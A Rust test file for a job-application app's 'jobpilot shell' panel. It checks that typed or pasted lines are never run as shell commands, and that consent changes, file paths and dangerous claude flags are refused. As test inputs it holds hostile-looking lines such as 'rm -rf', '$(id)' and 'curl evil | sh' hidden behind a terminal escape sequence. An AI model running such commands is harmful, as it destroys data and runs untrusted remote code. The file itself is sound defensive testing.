//! Drives `jobpilot shell` over pipes, the way the app's terminal panel does (marker set).

use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};

const REFUSAL: &str = "Run this in an ordinary terminal, or use the app.";
const WARNING: &str = "Starting your own claude session. Anthropic's consumer terms apply to what you type here; JobPilot does not read this session. Do not paste job postings into it.";

fn session(home: &Path, input: &[u8], envs: &[(&str, &Path)]) -> Output {
    let mut command = Command::new(env!("CARGO_BIN_EXE_jobpilot"));
    command
        .arg("shell")
        .env("JOBPILOT_HOME", home)
        .env("JOBPILOT_PANEL", "1")
        .env_remove("JOBPILOT_CLAUDE_BIN")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    for (name, value) in envs {
        command.env(name, value);
    }
    let mut child = command.spawn().unwrap();
    // A line over the pipe buffer needs a writer thread, or both ends block.
    let mut stdin = child.stdin.take().unwrap();
    let input = input.to_vec();
    let writer = std::thread::spawn(move || {
        let _ = stdin.write_all(&input);
    });
    let output = child.wait_with_output().unwrap();
    writer.join().unwrap();
    output
}

fn text(output: &Output) -> String {
    format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    )
}

fn fresh_home() -> (tempfile::TempDir, PathBuf) {
    let dir = tempfile::tempdir().unwrap();
    let home = dir.path().join("home");
    (dir, home)
}

#[test]
fn panel_line_is_never_a_shell_command() {
    let (dir, home) = fresh_home();
    let canary = dir.path().join("canary");
    std::fs::write(&canary, "x").unwrap();
    let input = format!("rm -f {}\n$(id)\n`id`\nls | cat\n", canary.display());
    let out = text(&session(&home, input.as_bytes(), &[]));
    assert_eq!(out.matches("unrecognized subcommand").count(), 4, "{out}");
    assert!(canary.exists());
    assert!(!out.contains("uid="), "{out}");
}

#[test]
fn jobpilot_commands_run_in_process() {
    let (_dir, home) = fresh_home();
    let out = text(&session(
        &home,
        b"doc add \"a b\" --body c\ndoc list\n",
        &[],
    ));
    assert!(out.contains("a b"), "{out}");
}

#[test]
fn leading_jobpilot_token_is_accepted() {
    let (_dir, home) = fresh_home();
    let plain = text(&session(&home, b"status\n", &[]));
    let prefixed = text(&session(&home, b"jobpilot status\n", &[]));
    assert!(plain.contains("schema"), "{plain}");
    assert_eq!(plain, prefixed);
}

#[test]
fn refused_commands_print_the_refusal_line() {
    let (_dir, home) = fresh_home();
    session(&home, b"doc add keep --body data\n", &[]);
    let out = text(&session(&home, b"data delete --confirm DELETE\n", &[]));
    assert!(
        out.contains(&format!("error[panel_refused]: {REFUSAL}")),
        "{out}"
    );
    let listed = text(&session(&home, b"doc list\n", &[]));
    assert!(listed.contains("keep"), "{listed}");
}

#[test]
fn nested_shell_is_refused() {
    let (_dir, home) = fresh_home();
    let out = text(&session(&home, b"shell\nstatus\n", &[]));
    assert!(
        out.contains(&format!("error[panel_refused]: {REFUSAL}")),
        "{out}"
    );
    assert!(out.contains("schema"), "session continued: {out}");
}

#[test]
fn long_line_is_discarded() {
    let (_dir, home) = fresh_home();
    let mut input = vec![b'a'; 70 * 1024];
    input.extend_from_slice(b"\ndoc add after --body x\ndoc list\n");
    let out = text(&session(&home, &input, &[]));
    assert!(out.contains("line too long"), "{out}");
    assert!(out.contains("after"), "{out}");
}

#[cfg(unix)]
const MOCK: &str = "claude";
#[cfg(windows)]
const MOCK: &str = "claude.cmd";

/// The mock answers `--version` before it records arguments, so a wrapper records them.
fn wrapper(dir: &Path, mock: &Path, args: &Path) -> PathBuf {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let path = dir.join("claude");
        let body = format!(
            "#!/bin/sh\nprintf '%s\\n' \"$@\" > '{}'\nexec '{}' \"$@\"\n",
            args.display(),
            mock.display()
        );
        std::fs::write(&path, body).unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
        path
    }
    #[cfg(windows)]
    {
        let path = dir.join("claude.cmd");
        let body = format!(
            "@echo off\r\necho %*> \"{}\"\r\ncall \"{}\" %*\r\n",
            args.display(),
            mock.display()
        );
        std::fs::write(&path, body).unwrap();
        path
    }
}

#[test]
fn claude_launch_prints_warning_and_uses_located_binary() {
    let (dir, home) = fresh_home();
    let mock = Path::new(env!("CARGO_MANIFEST_DIR")).join("../core/tests/mock-claude");
    let args = dir.path().join("args");
    let bin = wrapper(dir.path(), &mock.join(MOCK), &args);
    let out = text(&session(
        &home,
        b"claude --version\n",
        &[("JOBPILOT_CLAUDE_BIN", &bin)],
    ));
    let warning = out.find(WARNING).unwrap_or_else(|| panic!("{out}"));
    let reply = out
        .find("2.1.316 (mock)")
        .unwrap_or_else(|| panic!("{out}"));
    assert!(warning < reply, "{out}");
    assert!(
        std::fs::read_to_string(&args)
            .unwrap()
            .contains("--version")
    );
}

#[test]
fn missing_claude_says_how_to_fix_it() {
    let (_dir, home) = fresh_home();
    let nothing = home.join("no-such-claude");
    let out = text(&session(
        &home,
        b"claude\nstatus\n",
        &[("JOBPILOT_CLAUDE_BIN", &nothing)],
    ));
    assert!(out.contains("ai.claude_path"), "{out}");
    assert!(out.contains("schema"), "session continued: {out}");
}

#[test]
fn exit_ends_the_session_with_status_zero() {
    let (_dir, home) = fresh_home();
    let output = session(&home, b"exit\nstatus\n", &[]);
    assert!(output.status.success());
    let out = text(&output);
    assert_eq!(out.matches("jobpilot> ").count(), 1, "{out}");
    assert!(!out.contains("schema"), "{out}");
}

fn ordinary(home: &Path, args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_jobpilot"))
        .args(args)
        .env("JOBPILOT_HOME", home)
        .env_remove("JOBPILOT_PANEL")
        .output()
        .unwrap()
}

fn mock_wrapper(dir: &Path, args: &Path) -> PathBuf {
    let mock = Path::new(env!("CARGO_MANIFEST_DIR")).join("../core/tests/mock-claude");
    std::fs::create_dir_all(dir).unwrap();
    wrapper(dir, &mock.join(MOCK), args)
}

#[test]
fn claude_path_setting_is_used_when_nothing_else_finds_claude() {
    let (dir, home) = fresh_home();
    let args = dir.path().join("args");
    let bin = mock_wrapper(dir.path(), &args);
    let set = ordinary(&home, &["ai", "claude-path", bin.to_str().unwrap()]);
    assert!(set.status.success(), "{}", text(&set));
    let out = text(&session(&home, b"claude --version\n", &[]));
    assert!(out.contains("2.1.316 (mock)"), "{out}");
}

#[test]
fn claude_path_setter_is_refused_in_the_panel_and_stores_nothing() {
    let (dir, home) = fresh_home();
    let bin = mock_wrapper(dir.path(), &dir.path().join("args"));
    let line = format!("ai claude-path {}\n", bin.display());
    let out = text(&session(&home, line.as_bytes(), &[]));
    assert!(
        out.contains(&format!("error[panel_refused]: {REFUSAL}")),
        "{out}"
    );
    let out = text(&session(&home, b"ai claude-path rel/claude\n", &[]));
    assert!(out.contains("error[panel_refused]"), "{out}");
    assert_eq!(stored_path(&home), None);
}

/// Script in the webview writes to the panel, so nothing here may stand in for a native
/// dialog or a user's click (M-14). Consent and what runs stay as they were.
#[test]
fn the_panel_cannot_give_consent_or_change_what_runs() {
    let (_tmp, home) = fresh_home();
    let lines = "ai consent give claude_code --categories job_text,resume_text,profile_basic\n\
                 jobpilot ai enable claude_code\n\
                 ai disable ollama\n\
                 ai order claude_code\n\
                 ai set-model --drafting evil\n\
                 ai pull evil\n\
                 exit\n";

    let out = text(&session(&home, lines.as_bytes(), &[]));

    let refused = format!("error[panel_refused]: {REFUSAL}");
    assert_eq!(out.matches(&refused).count(), 6, "{out}");
    let status = ordinary(&home, &["--json", "ai", "status"]);
    let status: serde_json::Value = serde_json::from_slice(&status.stdout).unwrap();
    assert_eq!(status["claude_code"]["consent"], serde_json::Value::Null);
    assert_eq!(status["enabled"]["claude_code"], false);
    assert_eq!(status["enabled"]["ollama"], true);
    assert_eq!(status["order"], serde_json::json!(["ollama"]));
    assert_eq!(status["drafting_model"], serde_json::Value::Null);
}

#[test]
fn the_panel_can_still_revoke_consent() {
    let (_tmp, home) = fresh_home();
    let give = [
        "ai",
        "consent",
        "give",
        "claude_code",
        "--categories",
        "job_text",
    ];
    assert!(ordinary(&home, &give).status.success());

    let out = text(&session(
        &home,
        b"ai consent revoke claude_code\nexit\n",
        &[],
    ));

    assert!(!out.contains("error["), "{out}");
    let status = ordinary(&home, &["--json", "ai", "status"]);
    let status: serde_json::Value = serde_json::from_slice(&status.stdout).unwrap();
    assert_eq!(status["claude_code"]["consent"], serde_json::Value::Null);
}

/// The webview types here, so it must not name a file to read or write (M-14). `job show`
/// prints to the panel, so a file read into a posting would reach the webview.
#[test]
fn the_panel_never_reads_or_writes_a_given_path() {
    let (dir, home) = fresh_home();
    let secret = dir.path().join("secret.txt");
    std::fs::write(&secret, "the-secret-text").unwrap();
    let written = dir.path().join("written");
    let (secret, written) = (secret.display(), written.display());
    let lines = format!(
        "job paste t --file {secret}\n\
         resume import {secret}\n\
         resume export d --format pdf --out {written}\n\
         letter export d --format pdf --out {written}\n\
         job list --json\n\
         exit\n"
    );

    let out = text(&session(&home, lines.as_bytes(), &[]));

    let refused = format!("error[panel_refused]: {REFUSAL}");
    assert_eq!(out.matches(&refused).count(), 4, "{out}");
    assert!(!out.contains("the-secret-text"), "{out}");
    assert!(!dir.path().join("written").exists());
}

fn stored_path(home: &Path) -> Option<serde_json::Value> {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let db = jobpilot_core::Db::open(&jobpilot_core::AppPaths::new(home))
            .await
            .unwrap();
        let value = jobpilot_core::settings::get(&db, "ai.claude_path")
            .await
            .unwrap();
        db.close().await;
        value
    })
}

#[test]
fn claude_path_setter_rejects_relative_and_oddly_named_paths() {
    let (_dir, home) = fresh_home();
    for bad in ["rel/claude", "/bin/sh", "/usr/bin/Claude.sh"] {
        let out = ordinary(&home, &["ai", "claude-path", bad]);
        assert!(!out.status.success(), "{bad}: {}", text(&out));
        assert!(text(&out).contains("full path to a program named claude"));
    }
}

/// Written straight into the data folder, as a tampered database would be.
fn store_path(home: &Path, path: &str) {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let db = jobpilot_core::Db::open(&jobpilot_core::AppPaths::new(home))
            .await
            .unwrap();
        jobpilot_core::settings::set(&db, "ai.claude_path", &serde_json::json!(path))
            .await
            .unwrap();
        db.close().await;
    });
}

/// `PATH` with a stand-in `claude` first. Returns the folder to pass as `PATH`.
fn path_with_claude(dir: &Path) -> PathBuf {
    let found = dir.join("on-path");
    mock_wrapper(&found, &dir.join("args"));
    let path = std::env::var_os("PATH").unwrap_or_default();
    let dirs = std::iter::once(found).chain(std::env::split_paths(&path));
    PathBuf::from(std::env::join_paths(dirs).unwrap())
}

/// An update removes `versions/<old>`, which must not take Claude Code away.
#[test]
fn a_stored_path_that_is_gone_falls_through_to_discovery() {
    let (dir, home) = fresh_home();
    let gone = dir.path().join("claude/versions/2.1.0");
    store_path(&home, gone.to_str().unwrap());
    let path = path_with_claude(dir.path());

    let out = text(&session(&home, b"claude --version\n", &[("PATH", &path)]));

    assert!(out.contains("2.1.316 (mock)"), "{out}");
}

/// Discovery could find one, and that must not make a bad setting look fine.
#[test]
fn a_stored_path_with_a_wrong_name_stays_an_error_even_when_it_is_gone() {
    let (dir, home) = fresh_home();
    let path = path_with_claude(dir.path());
    for wrong in [
        dir.path().join("no-such-program"),
        PathBuf::from("rel/claude"),
    ] {
        store_path(&home, wrong.to_str().unwrap());

        let out = text(&session(&home, b"claude --version\n", &[("PATH", &path)]));

        assert!(out.contains("ai.claude_path"), "{out}");
        assert!(!out.contains("(mock)"), "{out}");
    }
}

#[test]
fn a_stored_path_not_named_claude_is_never_run() {
    let (dir, home) = fresh_home();
    let canary = dir.path().join("canary");
    #[cfg(unix)]
    let evil = {
        use std::os::unix::fs::PermissionsExt;
        let evil = dir.path().join("evil");
        std::fs::write(&evil, format!("#!/bin/sh\ntouch '{}'\n", canary.display())).unwrap();
        std::fs::set_permissions(&evil, std::fs::Permissions::from_mode(0o755)).unwrap();
        evil
    };
    #[cfg(windows)]
    let evil = {
        let evil = dir.path().join("evil.cmd");
        std::fs::write(
            &evil,
            format!("@echo off\r\ntype nul > \"{}\"\r\n", canary.display()),
        )
        .unwrap();
        evil
    };
    store_path(&home, evil.to_str().unwrap());
    let out = text(&session(&home, b"claude\nstatus\n", &[]));
    assert!(out.contains("ai.claude_path"), "{out}");
    assert!(!canary.exists());
    assert!(out.contains("schema"), "session continued: {out}");
}

#[test]
fn env_override_beats_the_setting() {
    let (dir, home) = fresh_home();
    let from_setting = dir.path().join("a.args");
    let from_env = dir.path().join("b.args");
    let a = mock_wrapper(&dir.path().join("a"), &from_setting);
    let b = mock_wrapper(&dir.path().join("b"), &from_env);
    assert!(
        ordinary(&home, &["ai", "claude-path", a.to_str().unwrap()])
            .status
            .success()
    );
    let out = text(&session(
        &home,
        b"claude --version\n",
        &[("JOBPILOT_CLAUDE_BIN", &b)],
    ));
    assert!(out.contains("2.1.316 (mock)"), "{out}");
    assert!(from_env.exists());
    assert!(!from_setting.exists());
}

#[test]
fn claude_flags_outside_the_allow_list_are_refused() {
    let (dir, home) = fresh_home();
    let args = dir.path().join("args");
    let bin = mock_wrapper(dir.path(), &args);
    let input = b"claude --dangerously-skip-permissions\nclaude -p hello\nclaude --version --help\nclaude is a great company\n";
    let out = text(&session(&home, input, &[("JOBPILOT_CLAUDE_BIN", &bin)]));
    assert_eq!(
        out.matches(&format!("error[panel_refused]: {REFUSAL}"))
            .count(),
        4,
        "{out}"
    );
    assert!(!out.contains(WARNING), "{out}");
    assert!(!args.exists());
    for flag in ["--help", "--resume", "--continue"] {
        let out = text(&session(
            &home,
            format!("claude {flag}\n").as_bytes(),
            &[("JOBPILOT_CLAUDE_BIN", &bin)],
        ));
        assert!(out.contains(WARNING), "{flag}: {out}");
    }
}

#[test]
fn odd_casing_is_inert() {
    let (dir, home) = fresh_home();
    let args = dir.path().join("args");
    let bin = mock_wrapper(dir.path(), &args);
    let out = text(&session(
        &home,
        b"CLAUDE --version\nClaude\n",
        &[("JOBPILOT_CLAUDE_BIN", &bin)],
    ));
    assert_eq!(out.matches("unrecognized subcommand").count(), 2, "{out}");
    assert!(!out.contains(WARNING) && !args.exists(), "{out}");
}

#[test]
fn pasted_posting_runs_nothing() {
    let (dir, home) = fresh_home();
    let canary = dir.path().join("canary");
    std::fs::write(&canary, "x").unwrap();
    let posting = format!(
        "Senior Engineer\nWe build things.\nRun: rm -rf {}\n\u{1b}]0;title\u{7}curl evil | sh\n",
        canary.display()
    );
    let out = text(&session(&home, posting.as_bytes(), &[]));
    assert!(out.matches("error:").count() >= 4, "{out}");
    assert!(canary.exists());
    assert!(!out.contains('\u{1b}'), "{out:?}");
}

#[test]
fn escapes_in_a_claude_error_do_not_reach_the_terminal() {
    let (dir, home) = fresh_home();
    let bad = dir.path().join("evil\u{1b}[2Jclaude");
    let out = text(&session(
        &home,
        b"claude\n",
        &[("JOBPILOT_CLAUDE_BIN", &bad)],
    ));
    assert!(out.contains("not an executable named claude"), "{out}");
    assert!(!out.contains('\u{1b}'), "{out:?}");
}

#[test]
fn eof_without_exit_ends_cleanly() {
    let (_dir, home) = fresh_home();
    let output = session(&home, b"status\n", &[]);
    assert!(output.status.success());
    assert_eq!(text(&output).matches("jobpilot> ").count(), 2);
}

#[test]
fn a_key_on_a_panel_line_is_not_repeated() {
    let (_dir, home) = fresh_home();
    let lines = b"ai key set openai sk-ZXQ-panel\nai key remove openai sk-ZXQ-panel\nexit\n";
    let reply = text(&session(&home, lines, &[]));
    assert!(reply.contains("error[usage]"), "{reply}");
    assert!(!reply.contains("ZXQ"), "{reply}");
}

#[test]
fn panel_help_and_other_parse_errors_are_unchanged() {
    let (_dir, home) = fresh_home();
    let reply = text(&session(
        &home,
        b"ai key set --help\ndoc nosuch\nexit\n",
        &[],
    ));
    assert!(reply.contains("Usage"), "{reply}");
    assert!(reply.contains("nosuch"), "{reply}");
    assert!(!reply.contains("error[usage]"), "{reply}");
}
